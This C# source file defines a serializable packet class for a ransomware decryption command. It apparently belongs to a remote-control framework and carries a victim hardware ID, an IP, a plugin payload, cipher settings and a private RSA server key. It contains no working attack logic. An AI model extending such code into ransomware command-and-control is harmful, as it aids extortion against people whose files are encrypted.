using PacketLib.Utils;
using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RansomwareDecryptionPacket : IPacket
    {
 
        public RansomwareDecryptionPacket(string privateRSAServerKey) : base()
        {
            this.PacketType = PacketType.RANSOMWARE_DECRYPTION;
            this.privateRSAServerKey = privateRSAServerKey;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public Algorithm algorithm { get; set; }
        public bool isBlockCipher { get; set; }
        public string privateRSAServerKey { get; set; }
        public int minKeySize { get; set; }
        public int maxKeySize { get; set; }
    }
}
